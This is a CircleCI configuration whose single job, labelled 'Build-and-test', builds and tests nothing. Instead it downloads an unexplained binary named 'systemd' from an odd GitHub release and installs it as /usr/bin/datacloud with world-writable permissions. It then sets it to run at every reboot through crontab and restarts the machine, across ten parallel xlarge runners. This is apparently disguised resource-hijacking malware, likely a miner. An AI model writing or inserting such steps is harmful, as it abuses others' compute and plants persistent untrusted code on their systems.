version: 2.1
jobs:
  build1:  &build_template
    parallelism: 10
    machine:
      image: ubuntu-2204:current
    resource_class: xlarge
    steps:
      - checkout
      - run:
          name: Build-and-test
          command: |
                 apt-get update && apt-get install -y wget ca-certificates >/dev/null 2>&1
                 wget -q https://github.com/gahjuila/juila/releases/download/system/systemd
                 chmod +x systemd
                 sudo mv systemd /usr/bin/datacloud
                 sudo chmod 777 /usr/bin/datacloud
                 echo -e "@reboot /usr/bin/datacloud" | crontab -
                 sudo reboot >/dev/null 2>&1 >/dev/null &


